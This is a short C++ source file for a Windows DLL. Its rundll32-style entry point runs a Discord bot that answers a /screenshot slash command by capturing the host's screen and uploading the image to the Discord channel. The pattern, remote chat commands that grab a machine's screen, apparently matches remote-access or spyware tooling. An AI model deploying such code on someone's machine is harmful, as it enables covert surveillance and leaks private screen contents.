#include <dpp/dpp.h>
#include "definition.h"
#include "bottoken.h"

void command_screenshot(const dpp::interaction_create_t&);

EXPORT Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	dpp::cluster bot(BOT_TOKEN);
	bot.on_log(dpp::utility::cout_logger());
	bot.on_slashcommand([](auto event) {
		std::string commandName = event.command.get_command_name();

		if(commandName == "screenshot") {
			printf("%s used the command /screenshot\n", event.command.usr.username);
			command_screenshot(event);
		}
	});

	bot.on_ready([&bot](auto event) {
		if(dpp::run_once<struct register_bot_commands>()) {
			bot.global_command_create(dpp::slashcommand("screenshot", "Take screenshot", bot.me.id));
		}
	});

	bot.start(dpp::st_wait);
}

void command_screenshot(const dpp::interaction_create_t& event) {
	size_t pngSize = NULL;
	BYTE* pngImage = screenshot(&pngSize);
	unsigned long long longValue = reinterpret_cast<unsigned long long>(pngImage);
	
	if(longValue == -1L) {
		event.reply("`Error: Not enough memory`");
		return;
	} else if(longValue == -2L) {
		event.reply("`Internal Error: GetDIBits() function error`");
		return;
	} else if(longValue == -3L) {
		event.reply("`Error: PNG compression error`");
		return;
	}

	std::string imageString(pngSize, '\u0000');

	for(unsigned int i = 0; i < pngSize; i++) {
		imageString[i] = pngImage[i];
	}

	free(pngImage);
	dpp::message message(event.command.channel_id, "");
	message.add_file("screenshot.png", imageString);
	printf("Sending screenshot. File size: %u\n", pngSize);
	event.reply(message);
}
